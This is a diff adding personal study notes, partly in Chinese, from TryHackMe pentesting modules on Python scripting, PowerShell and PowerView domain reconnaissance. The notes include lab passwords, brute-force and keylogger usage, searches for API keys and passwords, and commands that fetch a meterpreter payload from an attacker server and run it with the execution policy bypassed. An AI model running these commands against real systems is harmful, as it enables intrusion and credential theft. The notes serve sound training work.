@@ -1,0 +1,384 @@
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Scripting for Pentesters
+	--> https://tryhackme.com/module/scripting-for-pentesters
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	python :
+		--> pip install scapy/Request/Pwntools
+		--> py2exe : 將 Python 腳本轉換為 Windows 執行檔
+			=> python setup.py install
+				--> setup(console=['hello.py']) // change
+			=> python setup.py py2exe
+			
+			=> copying c:\Python24\lib\site-packages\py2exe\run.exe -> C:\Tutorial\dist\hello.exe
+		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+		--> cp /usr/share/wordlists/PythonForPentesters/wordlist2.txt wordlist2.txt 
+		
+		--> Subdomain Enumeration 子網域枚舉 
+			--> subdomains_0.py
+			--> /usr/share/wordlists/PythonForPentesters/wordlist2.txt
+			
+			--> usage : 
+				=> python3 subdomains_0.py 10.10.9.230
+				
+				=> sub_domains = f"http://{sys.argv[1]}/{sub}" 
+		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+		--> Directory Enumeration
+			--> directory_0.py
+			
+			--> usage :
+				=> python3 directory_0.py 10.10.9.230
+				
+				=> 副檔名是.html
+				=> dir_enum = f"http://{sys.argv[1]}/{dir}.html" 
+		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+		--> Network Scanner
+			--> network_0.py
+			--> apt install python3-scapy
+			
+			--> usage :
+				=> sudo python3 network_0.py
+				
+				=> interface = "eth0" //網路介面
+				=> ip_range = "10.10.X.X/24"
+		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+		--> Port Scanner
+			--> sudo nmap -sS -T5 10.10.9.230 -p1-10000
+			
+			--> port_0.py
+			--> apt install python3-pyfiglet
+			--> 刪除橫幅 : 
+				--> 刪除 ascii_banner = pyfiglet.figlet_format("TryHackMe \n Python 4 Pentesters \nPort Scanner") | print(ascii_banner)
+				
+			--> usage : 
+				=> sudo python3 port_0.py
+				
+				=> ip = '10.10.9.230'  //  目標
+				=> ip = socket.gethostbyname(host)
+				
+				=> ports = range(1, 65535) //all 
+				=> ports = { 21, 22, 23, 53, 80, 135, 443, 445} //指定
+		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+		--> File Downloader
+			--> same to Wget / Certutil (window)
+			--> file_0.py
+			
+			--> usage : 
+				=> url = 'https://assets.tryhackme.com/img/THMlogo.png'
+				=> open('THMlogo.png', 'wb').write(r.content)
+		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+		--> Hash Cracker (md5)
+			--> hash_0.py
+			--> usage : 
+				=> python3 hash_0.py
+				
+				=> Enter wordlist file location: /home/kali/2024_5_CTF/python/wordlist2.txt
+				=> Enter hash to be cracked: cd13b6a6af66fb774faa589a9d18f906
+				
+				=> hash_ob = hashlib.md5(line.strip().encode())
+				=> hash_ob = hashlib.sha256(line.strip().encode())
+		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+		--> Keyloggers
+			--> keyloggers_0.py
+			--> sudo pip3 install keyboard
+			--> need root 
+			--> 記錄和重播按下的按鍵
+			
+			--> usage : 
+				=> sudo python3 keyloggers_0.py
+		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+		--> SSH Brute Forcing
+			--> ssh_0.py
+			
+			--> ssh tiffany@10.10.9.230 | trustno1
+			--> usage : 
+				=> python3 ssh_0.py
+				
+				=> Please enter target IP address: 10.10.9.230
+				=> Please enter username to bruteforce: tiffany
+				=> Please enter location of the password file: wordlist2.txt
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+RDP: 
+	--> xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:10.10.37.243 /u:Administrator /p:'BHN2UVw0Q'
+	--> xfreerdp /v:10.10.37.243 /u:Administrator /p:BHN2UVw0Q /dynamic-resolution
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+PowerShell
+	--> 使用 .NET 框架建構的 Windows 腳本語言和 shell 環境
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	--> PowerShell command : 
+	
+		--> commom verb : 
+			=> Get
+			=> Start
+			=> Stop 
+			=> Read
+			=> Write
+			=> New
+			=> Out
+			--> Get-New |取得新物件
+			
+		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~	
+		--> Get-Command |列出指令的cmdlet 
+		--> Get-Help | 顯示有​​關cmdlet 的資訊
+			--> Get-Help Command-Name
+			--> -examples : 了解到底如何使用該命令
+				=>  Get-Help Get-Command -Examples
+				
+		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+		--> Pipeline(|) 將物件傳遞給下一個cmdlet
+			=>  Get-Command | Get-Member -MemberType Method | 查看成員
+			
+		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+		--> Select-Object
+			=>  Get-ChildItem | Select-Object -Property Mode, Name
+				--> output all Mode and Name of Get-ChildItem 
+				--> 特定資訊
+					--> first
+					--> last
+					--> unique
+					--> skip
+					
+		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+		--> Where-Object
+			=> Get-Service | Where-Object -Property Status -eq Stopped
+			
+			--> 格式 : 
+				--> Verb-Noun | Where-Object -Property PropertyName -operator Value
+				--> Verb-Noun | Where-Object {$_.PropertyName -operator Value}
+			--> type : 
+				--> -Contains : 屬性值中的任何一項與指定值完全匹配
+				--> -EQ : 屬性值與指定值相同
+				--> -GT : 屬性值大於指定值
+				
+		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+		Sort-Object	
+			=> Get-ChildItem | Sort-Object
+			
+		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+		find file"interesting-file.txt" 
+			--> location : 
+				=> Get-ChildItem “*interesting-file*” -Path C:\ -Recurse -ErrorAction SilentlyContinue
+					--> show that : Directory: C:\Program Files
+			--> contents :
+				=> Get-ChildItem “*interesting-file*” -Path C:\ -Recurse -ErrorAction SilentlyContinue | Get-Content
+					--> show that : notsointerestingcontent
+			--> MD5 hash
+				=> Get-ChildItem “*interesting-file*” -Path C:\ -Recurse -ErrorAction SilentlyContinue | Get-FileHash -Algorithm MD5
+					--> show that : 49A586A2A9456226F8A1B4CEC6FAB329
+		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+		how many cmdlets are installed on the system
+			=> (Get-Command | Where-Object {$_.CommandType -eq “Cmdlet”}).Count
+					--> show that : 6638
+			=> .count (how many)
+		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+		get the current working directory
+		 	=> Get-Location
+		 	=> same to pwd
+		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 
+		Does the path Exist ?
+			=>if(Set-Location C:\Users\Administrator\Documents\Passwords)
+{Write-Host "It exists!"}Else{Write-Host "The path doesn't exist bro."}
+		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+		make a request to a web server
+			=> Invoke-WebRequest
+				=> uri --> url
+		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+		Base64 decode:
+			=> Get-ChildItem "b64.txt" -Path C:\ -Recurse -ErrorAction SilentlyContinue 
+					--> show that :Directory: C:\Users\Administrator\Desktop
+			=> Get-Content C:\Users\Administrator\Desktop\b64.txt 		
+	
+		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+		enumerate:
+			--> users
+				--> (Get-LocalUser).Name.Count
+				--> (Get-LocalUser | Select-Object * | Where-Object {$_.SID -eq "S-1-5-21-1394777289-3961777894-1791813945-501"}).Name
+				--> (Get-LocalUser | Select-Object * | Where-Object {$_.PasswordRequired -eq "$Fales"}).Count
+				
+				--> (Get-LocalGroup).Name.Count
+			~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+			--> basic networking information
+				--> IP address : 
+					=> Get-NetIPAddress 
+				--> ports :
+					=> (Get-NetTCPConnection | Where-Object {$_.State -eq "Listen"}).Count
+					=> Get-NetTCPConnection | Where-Object {($_.State -eq “Listen”) -and ($_.LocalPort -ge 130) -and ($_.LocalPort -le 140)}
+				--> remote address
+					=> Get-NetTCPConnection | Where-Object {($_.State -eq "Listen") -and ($_.LocalPort -eq "445")}
+			~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+			--> file permissions :
+				--> backup file
+					=> Get-ChildItem "*.bak*" -Path C:\ -Recurse -ErrorAction SilentlyContinue | Get-Content
+				--> API_KEY
+					=> Get-ChildItem -Path C:\Users -Recurse -ErrorAction SilentlyContinue | Select-String "API_KEY"
+				--> password
+					=> Get-ChildItem -Path C:\Users\Administrator\Desktop\emails -Recurse -ErrorAction SilentlyContinue | Select-String “password”
+				--> HTTPS link
+					=> Get-ChildItem -Path C:\Users\Administrator\Desktop\emails -Recurse -ErrorAction SilentlyContinue | Select-String “HTTPS”
+			~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~		
+			--> registry permissions
+				--> patches
+					=> (Get-HotFix).Count
+					=> Get-HotFix | Where-Object {$_.HotFixID -eq "KB4023834"} | Select-Object * | Select-Object InstalledOn	
+			~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+			--> scheduled and running tasks
+				--> running processes
+					=> Get-Process
+				--> scheduled :
+					=> (Get-ScheduledTask | Where-Object {$_.TaskName -eq “new-sched-task”}).TaskPath
+			--> insecure files
+				=> (Get-Acl -Path “C:\”).Owner
+			~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~	
+
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	--> Power Shell Scripting  : 
+		--> format : 
+			--> https://learnxinyminutes.com/docs/powershell/
+			
+		--> basic : 
+			--> 註解 #
+			--> $a (var) |  @() | @[] | @{}
+			--> -eq (=) | -lt (<) | -le (<=) | -gt (>) | -ge (>=)
+			--> Write-Output (print) 
+			--> foreach ($a in (1,2,3))
+		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+		--> Powershell ISE（Powershell 文字編輯器）
+			--> .ps1 
+				=> 查看本地連接埠是否正在偵聽 : waiting-ports.ps1
+				=> 查看檔案包含密碼 : password.ps1
+				=> 查看檔案包含 HTTPS連結 :htmls_link.ps1
+				=> 查看開放連接埠:port_scan.ps1	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+PowerShell for Pentesters : 
+	--> PowerSploit 或 Nishang (防毒軟體 can check)
+	--> ssh walter@10.10.210.144 | Kowacs123! => powershell
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	--> 操作文件 
+		--> Start-Process : 可用於啟動進程
+			=> Start-Process notepad.exe
+	
+		--> Get-Process :列出所有正在運行的進程
+			=> Get-Process -Name notepad
+				=> -name 過濾特定的進程名稱
+			=> Get-Process | Export-Csv outputfile.csv
+				=> Export-Csv 來建立一個 CSV 檔案
+				
+		--> Get-Content
+			=> Get-Content .\outputfile.csv
+			=> Get-Content -Name Out*
+		--> Copy-Item 複製檔案 | Move-Item 移動檔案
+			=> Copy-Item .\aaa.txt copy_aaa.txt
+
+	
+		--> Get-FileHash 
+			=> Get-FileHash -Algorithm MD5 .\aaa.txt
+			=> Get-FileHash -Algorithm SHA256 .\aaa.txt
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	-->下載文件
+		--> kali : python3 -m http.server 8888
+		--> PS :
+			--> (New-Object System.Net.WebClient).Downloadfile('http://10.11.92.230:8888/2024_5_CTF/PowerShell/meterpeter.ps1', 'meterpreter.ps1')
+			--> Invoke-WebRequest "http://10.11.92.230:8888/2024_5_CTF/PowerShell/meterpeter.ps1" -OutFile "meterpreter2.ps1"
+			=> .\meterpreter.ps1
+		
+		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~	
+		--> Get-ExecutionPolicy -list (執行策略)
+			=> AllSigned -- 要求所有腳本均由受信任的發布者簽署
+			=> Bypass -- 不會顯示任何警告或提示
+			=> Default
+				--> “restricted” for Windows clients 
+				--> “RemoteSigned” for Windows servers
+			=> RemoteSigned -- 不需要對本機腳本進行數位簽章
+			=> Restricted -- 允許運行單一命令，不允許運行腳本
+			=> Undefined -- 強制執行Default執行策略
+			=> Unrestricted -- 大多數腳本都會運行
+			
+			--> powershell -ExecutionPolicy Bypass -File .\meterpreter.ps1
+			--> Set-ExecutionPolicy Bypass -Scope Process (目前PowerShell會話)
+			
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	--> 系統偵察
+		-->尋找遺失的修補程式(Patches)
+			--> Get-Hotfix
+			--> Get-Hotfix | Format-list | findstr instailedOn
+				=> Format-list | Format-Table 
+				=> findstr = grep 
+				=> Out-File aaa.txt 將輸出儲存到文件中
+				=> Out-Gridview -- 漂亮的GUI
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	--> 網路偵察
+		-->  ping 從 10.0.2.1 到 10.0.2.15 的 IP 位址
+			=> 1..15 | %{echo "10.0.2.$_"}; ping -n 1 10.0.2.$_ | Select-String ttl
+		--> 掃描目標的前 1024 個TCP連接埠
+			=> 1..1024 | %{echo ((New-Object Net.Sockets.TcpClient),Connect("10.0.2.8", $_)) "Open port on - $_"} 2>null
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	--> PowerView
+		--> 收集域資訊最有效的方法之一
+		--> https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1
+		--> https://book.hacktricks.xyz/windows/basic-powershell-for-pentesters/powerview
+		
+		--> Start : 
+			=> Set-ExecutionPolicy Bypass -Scope Process
+			=> Import-Module .\powerview.ps1
+	
+	--> GET-Info	
+		--> Get-NetDomainController : 將收集有關網域控制器的資訊
+			=> understand : IPAddress 
+			
+		--> Get-NetUser : 提供網域使用者清單
+			=> Get-NetUser | out-gridview 
+			=> (Get-NetUser).name
+			
+			=> Get-NetUser | select -ExpandProperty lastlogon
+				--> 列出使用者的上次登入日期和時間
+			=> Get-NetUser | select -ExpandProperty description
+			
+			=> Get-NetUsers -Domain infra.munn.local
+			
+		--> Get-NetComputer  : 枚舉連接到網域的系統 -- 當前在線
+			=> Get-NetComputer -ping
+			
+		--> Get-NetGroup : 列舉現有的群組
+
+		--> Get-NetGroupMember :列舉該群組的成員
+			=> Get-NetGroupMember "Domain Admins"
+			
+		--> Find-DomainShare : 列出可讀共用的股票
+			=> Find-DomainShare -CheckShareAccess 
+			
+		--> Get-NetGPO : 收集有關強制執行策略的資訊
+		
+		--> Get-NetDomainTrus : 列出您可以存取的任何網域
+		
+		--> Find-LocalAdminAccess : 出您可以作為本機管理員存取的網域中的系統
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	Task : 
+	--> find file : 
+		=> Get-ChildItem “*.ps1” -Path C:\Users\Walter\Desktop
+	--> MD5 
+		=> Get-FileHash -Algorithm MD5 .\powerview.ps1
+	
+	--> Update
+		=> (Get-HotFix | Where-Object {$_.InstalledOn -like “*5/15/2019*”}).HotFixID
+	
+	--> description account 
+		=> Get-NetUser -Properties description
+	
+	--> disabled account 
+		=> Get-NetUser -Properties useraccountcontrol | findstr ACCOUNTDISABLE | measure
+		
+	--> domain admins
+		=> Get-NetGroupMember "Domain Admins" | measure
+		=> Get-NetGroupMember “Domain Admins” | Sort-Object MemberName | Format-Table MemberName
+		
+	-->  share file
+		=> Find-DomainShare
+			
+	-->  Group Policy
+		=> Get-NetGPO -Properties displayname
+		
+	--> first names of users’ whose accounts were disabled
+		=> Get-NetUser | Sort-Object displayname | Where-Object -Property useraccountcontrol -Match ACCOUNTDISABLE | Format-Table displayname
+	
+	
+	
+	
